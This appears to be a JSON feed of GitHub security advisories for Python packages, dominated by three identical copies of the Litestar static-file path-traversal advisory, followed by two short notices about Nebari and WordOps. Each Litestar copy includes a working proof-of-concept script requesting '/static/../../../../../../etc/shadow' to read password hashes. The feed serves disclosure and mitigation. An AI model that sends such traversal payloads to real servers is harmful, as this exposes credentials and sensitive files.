{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p><strong>Local File Inclusion via Path Traversal in LiteStar Static File Serving</strong></p>\n<p>A Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a>. This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.</p>\n<h2 id=\"details\">Details</h2>\n<p>The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at <a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">line 70 in <code>litestar/static_files/base.py</code></a>.</p>\n<p>The function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:</p>\n<pre><code class=\"language-python\">commonpath([str(directory), file_info[\"name\"], joined_path])\n</code></pre>\n<p>Given the variables:</p>\n<pre><code class=\"language-python\">directory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n</code></pre>\n<p>The function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.</p>\n<h2 id=\"proof-of-concept-poc\">Proof of Concept (PoC)</h2>\n<p>To reproduce this vulnerability, follow these steps:</p>\n<ol>\n<li><p><strong>Set up the environment:</strong></p>\n<ul>\n<li>Install with pip the <code>uvicorn</code> and <code>litestar</code> packages.</li>\n<li>Create a <code>static</code> folder in the root directory of your project and place any file (e.g., an image) in it for testing.</li>\n<li>Ensure the static file serving is enabled, which is typically the default configuration.</li>\n</ul>\n</li>\n<li><p><strong>Preparation of the testing environment:</strong></p>\n<ul>\n<li>If using Ubuntu or a similar system, you can use <code>/etc/shadow</code> which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.</li>\n<li>Create a <code>main.py</code> file with the following content to configure and run the LiteStar server:</li>\n</ul>\n<pre><code class=\"language-python\">from pathlib import Path\nfrom litestar import Litestar\nfrom litestar.static_files import create_static_files_router\nimport uvicorn\n\napp = Litestar(\n    route_handlers=[\n        create_static_files_router(path=\"/static\", directories=[\"static\"]),\n    ],\n)\n\nif __name__ == \"__main__\":\n    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n</code></pre>\n<ul>\n<li>Run this script with the command <code>python3 main.py</code> to start the server.</li>\n</ul>\n</li>\n<li><p><strong>Exploit:</strong></p>\n<ul>\n<li>Prepare an exploit script named <code>exploit.py</code> with the following Python code to perform the HTTP request without client-side sanitization:</li>\n</ul>\n<pre><code class=\"language-python\">import http.client\n\ndef send_request(host, port, path):\n    connection = http.client.HTTPConnection(host, port)\n    connection.request(\"GET\", path)\n    response = connection.getresponse()\n    print(f\"Status: {response.status}\")\n    print(f\"Headers: {response.getheaders()}\")\n    data = response.read()\n    print(f\"Body: {data.decode('utf-8')}\")\n    connection.close()\n\nsend_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n</code></pre>\n<ul>\n<li>Execute this script using <code>python3 exploit.py</code>. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.</li>\n</ul>\n</li>\n<li><p><strong>Observe:</strong></p>\n<ul>\n<li>The server should respond with the contents of the <code>/etc/shadow</code> file, thereby confirming the path traversal vulnerability.</li>\n<li>The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"impact\">Impact</h2>\n<p>This Local File Inclusion vulnerability critically affects all instances of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:</p>\n<ol>\n<li><p><strong>Exposure of Sensitive Information:</strong></p>\n<ul>\n<li>The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.</li>\n</ul>\n</li>\n<li><p><strong>Potential for System Compromise:</strong></p>\n<ul>\n<li>If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a <code>.env</code> file might reveal environment variables used for application configurations that include database passwords or API keys.</li>\n</ul>\n</li>\n<li><p><strong>Credential Leakage:</strong></p>\n<ul>\n<li>Access to files such as <code>/etc/passwd</code> or <code>/etc/shadow</code> (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.</li>\n</ul>\n</li>\n<li><p><strong>Regulatory and Compliance Violations:</strong></p>\n<ul>\n<li>Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.</li>\n</ul>\n</li>\n<li><p><strong>Loss of Trust and Reputation Damage:</strong></p>\n<ul>\n<li>Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.</li>\n</ul>\n</li>\n<li><p><strong>Potential for Further Exploitation:</strong></p>\n<ul>\n<li>The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.</li>\n</ul>\n</li>\n</ol>\n<p>Here's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:</p>\n<h2 id=\"mitigation-suggestion\">Mitigation Suggestion</h2>\n<p>To effectively address the Local File Inclusion vulnerability via path traversal identified in the <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:</p>\n<ol>\n<li><p><strong>Input Validation and Sanitization:</strong></p>\n<ul>\n<li>Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as <code>../</code> which are used in path traversal attacks.</li>\n<li>Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.</li>\n</ul>\n</li>\n<li><p><strong>Path Normalization:</strong></p>\n<ul>\n<li>Normalize file paths before using them in file operations. Functions such as <code>os.path.normpath()</code> in Python can be used to normalize paths. This method resolves redundant separators and up-level references (<code>../</code>) to prevent directory traversal.</li>\n<li>As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:<pre><code class=\"language-python\">if os.path.commonpath([full_path, directory]) != directory:\n    # Don't allow misbehaving clients to break out of the static files\n    # directory.\n    continue\n</code></pre>\nThis snippet from <a href=\"https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166\">Starlette's implementation</a> ensures that the constructed file path does not traverse out of the specified directory.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"comments\">Comments</h2>\n<p><strong>Naming Convention:</strong></p>\n<ul>\n<li>From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"</li>\n<li>Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"</li>\n</ul>\n<p><strong>Feature Additions and Changes:</strong></p>\n<ul>\n<li>Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.</li>\n<li>Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32982\">https://nvd.nist.gov/vuln/detail/CVE-2024-32982</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b\">https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/advisories/GHSA-83pv-qr33-2vcf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf",
            "title": "[litestar] Litestar and Starlite vulnerable to Path Traversal",
            "date_modified": "2024-05-06T20:48:37.000Z",
            "date_published": "2024-05-06T14:20:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p><strong>Local File Inclusion via Path Traversal in LiteStar Static File Serving</strong></p>\n<p>A Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a>. This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.</p>\n<h2 id=\"details\">Details</h2>\n<p>The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at <a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">line 70 in <code>litestar/static_files/base.py</code></a>.</p>\n<p>The function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:</p>\n<pre><code class=\"language-python\">commonpath([str(directory), file_info[\"name\"], joined_path])\n</code></pre>\n<p>Given the variables:</p>\n<pre><code class=\"language-python\">directory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n</code></pre>\n<p>The function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.</p>\n<h2 id=\"proof-of-concept-poc\">Proof of Concept (PoC)</h2>\n<p>To reproduce this vulnerability, follow these steps:</p>\n<ol>\n<li><p><strong>Set up the environment:</strong></p>\n<ul>\n<li>Install with pip the <code>uvicorn</code> and <code>litestar</code> packages.</li>\n<li>Create a <code>static</code> folder in the root directory of your project and place any file (e.g., an image) in it for testing.</li>\n<li>Ensure the static file serving is enabled, which is typically the default configuration.</li>\n</ul>\n</li>\n<li><p><strong>Preparation of the testing environment:</strong></p>\n<ul>\n<li>If using Ubuntu or a similar system, you can use <code>/etc/shadow</code> which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.</li>\n<li>Create a <code>main.py</code> file with the following content to configure and run the LiteStar server:</li>\n</ul>\n<pre><code class=\"language-python\">from pathlib import Path\nfrom litestar import Litestar\nfrom litestar.static_files import create_static_files_router\nimport uvicorn\n\napp = Litestar(\n    route_handlers=[\n        create_static_files_router(path=\"/static\", directories=[\"static\"]),\n    ],\n)\n\nif __name__ == \"__main__\":\n    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n</code></pre>\n<ul>\n<li>Run this script with the command <code>python3 main.py</code> to start the server.</li>\n</ul>\n</li>\n<li><p><strong>Exploit:</strong></p>\n<ul>\n<li>Prepare an exploit script named <code>exploit.py</code> with the following Python code to perform the HTTP request without client-side sanitization:</li>\n</ul>\n<pre><code class=\"language-python\">import http.client\n\ndef send_request(host, port, path):\n    connection = http.client.HTTPConnection(host, port)\n    connection.request(\"GET\", path)\n    response = connection.getresponse()\n    print(f\"Status: {response.status}\")\n    print(f\"Headers: {response.getheaders()}\")\n    data = response.read()\n    print(f\"Body: {data.decode('utf-8')}\")\n    connection.close()\n\nsend_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n</code></pre>\n<ul>\n<li>Execute this script using <code>python3 exploit.py</code>. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.</li>\n</ul>\n</li>\n<li><p><strong>Observe:</strong></p>\n<ul>\n<li>The server should respond with the contents of the <code>/etc/shadow</code> file, thereby confirming the path traversal vulnerability.</li>\n<li>The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"impact\">Impact</h2>\n<p>This Local File Inclusion vulnerability critically affects all instances of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:</p>\n<ol>\n<li><p><strong>Exposure of Sensitive Information:</strong></p>\n<ul>\n<li>The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.</li>\n</ul>\n</li>\n<li><p><strong>Potential for System Compromise:</strong></p>\n<ul>\n<li>If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a <code>.env</code> file might reveal environment variables used for application configurations that include database passwords or API keys.</li>\n</ul>\n</li>\n<li><p><strong>Credential Leakage:</strong></p>\n<ul>\n<li>Access to files such as <code>/etc/passwd</code> or <code>/etc/shadow</code> (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.</li>\n</ul>\n</li>\n<li><p><strong>Regulatory and Compliance Violations:</strong></p>\n<ul>\n<li>Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.</li>\n</ul>\n</li>\n<li><p><strong>Loss of Trust and Reputation Damage:</strong></p>\n<ul>\n<li>Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.</li>\n</ul>\n</li>\n<li><p><strong>Potential for Further Exploitation:</strong></p>\n<ul>\n<li>The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.</li>\n</ul>\n</li>\n</ol>\n<p>Here's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:</p>\n<h2 id=\"mitigation-suggestion\">Mitigation Suggestion</h2>\n<p>To effectively address the Local File Inclusion vulnerability via path traversal identified in the <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:</p>\n<ol>\n<li><p><strong>Input Validation and Sanitization:</strong></p>\n<ul>\n<li>Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as <code>../</code> which are used in path traversal attacks.</li>\n<li>Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.</li>\n</ul>\n</li>\n<li><p><strong>Path Normalization:</strong></p>\n<ul>\n<li>Normalize file paths before using them in file operations. Functions such as <code>os.path.normpath()</code> in Python can be used to normalize paths. This method resolves redundant separators and up-level references (<code>../</code>) to prevent directory traversal.</li>\n<li>As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:<pre><code class=\"language-python\">if os.path.commonpath([full_path, directory]) != directory:\n    # Don't allow misbehaving clients to break out of the static files\n    # directory.\n    continue\n</code></pre>\nThis snippet from <a href=\"https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166\">Starlette's implementation</a> ensures that the constructed file path does not traverse out of the specified directory.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"comments\">Comments</h2>\n<p><strong>Naming Convention:</strong></p>\n<ul>\n<li>From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"</li>\n<li>Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"</li>\n</ul>\n<p><strong>Feature Additions and Changes:</strong></p>\n<ul>\n<li>Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.</li>\n<li>Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32982\">https://nvd.nist.gov/vuln/detail/CVE-2024-32982</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b\">https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/advisories/GHSA-83pv-qr33-2vcf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf",
            "title": "[litestar] Litestar and Starlite vulnerable to Path Traversal",
            "date_modified": "2024-05-06T20:48:37.000Z",
            "date_published": "2024-05-06T14:20:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p><strong>Local File Inclusion via Path Traversal in LiteStar Static File Serving</strong></p>\n<p>A Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a>. This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.</p>\n<h2 id=\"details\">Details</h2>\n<p>The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at <a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">line 70 in <code>litestar/static_files/base.py</code></a>.</p>\n<p>The function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:</p>\n<pre><code class=\"language-python\">commonpath([str(directory), file_info[\"name\"], joined_path])\n</code></pre>\n<p>Given the variables:</p>\n<pre><code class=\"language-python\">directory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n</code></pre>\n<p>The function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.</p>\n<h2 id=\"proof-of-concept-poc\">Proof of Concept (PoC)</h2>\n<p>To reproduce this vulnerability, follow these steps:</p>\n<ol>\n<li><p><strong>Set up the environment:</strong></p>\n<ul>\n<li>Install with pip the <code>uvicorn</code> and <code>litestar</code> packages.</li>\n<li>Create a <code>static</code> folder in the root directory of your project and place any file (e.g., an image) in it for testing.</li>\n<li>Ensure the static file serving is enabled, which is typically the default configuration.</li>\n</ul>\n</li>\n<li><p><strong>Preparation of the testing environment:</strong></p>\n<ul>\n<li>If using Ubuntu or a similar system, you can use <code>/etc/shadow</code> which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.</li>\n<li>Create a <code>main.py</code> file with the following content to configure and run the LiteStar server:</li>\n</ul>\n<pre><code class=\"language-python\">from pathlib import Path\nfrom litestar import Litestar\nfrom litestar.static_files import create_static_files_router\nimport uvicorn\n\napp = Litestar(\n    route_handlers=[\n        create_static_files_router(path=\"/static\", directories=[\"static\"]),\n    ],\n)\n\nif __name__ == \"__main__\":\n    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n</code></pre>\n<ul>\n<li>Run this script with the command <code>python3 main.py</code> to start the server.</li>\n</ul>\n</li>\n<li><p><strong>Exploit:</strong></p>\n<ul>\n<li>Prepare an exploit script named <code>exploit.py</code> with the following Python code to perform the HTTP request without client-side sanitization:</li>\n</ul>\n<pre><code class=\"language-python\">import http.client\n\ndef send_request(host, port, path):\n    connection = http.client.HTTPConnection(host, port)\n    connection.request(\"GET\", path)\n    response = connection.getresponse()\n    print(f\"Status: {response.status}\")\n    print(f\"Headers: {response.getheaders()}\")\n    data = response.read()\n    print(f\"Body: {data.decode('utf-8')}\")\n    connection.close()\n\nsend_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n</code></pre>\n<ul>\n<li>Execute this script using <code>python3 exploit.py</code>. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.</li>\n</ul>\n</li>\n<li><p><strong>Observe:</strong></p>\n<ul>\n<li>The server should respond with the contents of the <code>/etc/shadow</code> file, thereby confirming the path traversal vulnerability.</li>\n<li>The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"impact\">Impact</h2>\n<p>This Local File Inclusion vulnerability critically affects all instances of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:</p>\n<ol>\n<li><p><strong>Exposure of Sensitive Information:</strong></p>\n<ul>\n<li>The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.</li>\n</ul>\n</li>\n<li><p><strong>Potential for System Compromise:</strong></p>\n<ul>\n<li>If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a <code>.env</code> file might reveal environment variables used for application configurations that include database passwords or API keys.</li>\n</ul>\n</li>\n<li><p><strong>Credential Leakage:</strong></p>\n<ul>\n<li>Access to files such as <code>/etc/passwd</code> or <code>/etc/shadow</code> (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.</li>\n</ul>\n</li>\n<li><p><strong>Regulatory and Compliance Violations:</strong></p>\n<ul>\n<li>Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.</li>\n</ul>\n</li>\n<li><p><strong>Loss of Trust and Reputation Damage:</strong></p>\n<ul>\n<li>Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.</li>\n</ul>\n</li>\n<li><p><strong>Potential for Further Exploitation:</strong></p>\n<ul>\n<li>The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.</li>\n</ul>\n</li>\n</ol>\n<p>Here's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:</p>\n<h2 id=\"mitigation-suggestion\">Mitigation Suggestion</h2>\n<p>To effectively address the Local File Inclusion vulnerability via path traversal identified in the <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:</p>\n<ol>\n<li><p><strong>Input Validation and Sanitization:</strong></p>\n<ul>\n<li>Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as <code>../</code> which are used in path traversal attacks.</li>\n<li>Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.</li>\n</ul>\n</li>\n<li><p><strong>Path Normalization:</strong></p>\n<ul>\n<li>Normalize file paths before using them in file operations. Functions such as <code>os.path.normpath()</code> in Python can be used to normalize paths. This method resolves redundant separators and up-level references (<code>../</code>) to prevent directory traversal.</li>\n<li>As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:<pre><code class=\"language-python\">if os.path.commonpath([full_path, directory]) != directory:\n    # Don't allow misbehaving clients to break out of the static files\n    # directory.\n    continue\n</code></pre>\nThis snippet from <a href=\"https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166\">Starlette's implementation</a> ensures that the constructed file path does not traverse out of the specified directory.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"comments\">Comments</h2>\n<p><strong>Naming Convention:</strong></p>\n<ul>\n<li>From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"</li>\n<li>Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"</li>\n</ul>\n<p><strong>Feature Additions and Changes:</strong></p>\n<ul>\n<li>Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.</li>\n<li>Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32982\">https://nvd.nist.gov/vuln/detail/CVE-2024-32982</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b\">https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/advisories/GHSA-83pv-qr33-2vcf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf",
            "title": "[litestar] Litestar and Starlite vulnerable to Path Traversal",
            "date_modified": "2024-05-06T20:48:37.000Z",
            "date_published": "2024-05-06T14:20:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Nebari through 2024.4.1 prints the temporary Keycloak root password.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34529\">https://nvd.nist.gov/vuln/detail/CVE-2024-34529</a></li>\n<li><a href=\"https://github.com/nebari-dev/nebari/issues/2282\">https://github.com/nebari-dev/nebari/issues/2282</a></li>\n<li><a href=\"https://github.com/nebari-dev/nebari/blob/5463e8df9e8d53a266a7b9d3d4e27353ec43c40b/src/_nebari/deploy.py#L71\">https://github.com/nebari-dev/nebari/blob/5463e8df9e8d53a266a7b9d3d4e27353ec43c40b/src/_nebari/deploy.py#L71</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vjc4-3vgx-pq9h\">https://github.com/advisories/GHSA-vjc4-3vgx-pq9h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vjc4-3vgx-pq9h",
            "title": "[nebari] Nebari prints temporary Keycloak root password",
            "date_modified": "2024-05-06T14:35:51.000Z",
            "date_published": "2024-05-06T00:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vjc4-3vgx-pq9h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>WordOps through 3.20.0 has a <code>wo/cli/plugins/stack_pref.py</code> TOCTOU race condition because the <code>conf_path</code> <code>os.open</code> does not use a mode parameter during file creation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34528\">https://nvd.nist.gov/vuln/detail/CVE-2024-34528</a></li>\n<li><a href=\"https://github.com/WordOps/WordOps/issues/611\">https://github.com/WordOps/WordOps/issues/611</a></li>\n<li><a href=\"https://github.com/WordOps/WordOps/blob/ecf20192c7853925e2cb3f8c8378cd0d86ca0d62/wo/cli/plugins/stack_pref.py#L77\">https://github.com/WordOps/WordOps/blob/ecf20192c7853925e2cb3f8c8378cd0d86ca0d62/wo/cli/plugins/stack_pref.py#L77</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-23qq-p4gq-gc2g\">https://github.com/advisories/GHSA-23qq-p4gq-gc2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-23qq-p4gq-gc2g",
            "title": "[wordops] WordOps has TOCTOU race condition",
            "date_modified": "2024-05-06T14:35:40.000Z",
            "date_published": "2024-05-06T00:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-23qq-p4gq-gc2g"
            },
            "tags": [
                "severity"
            ]
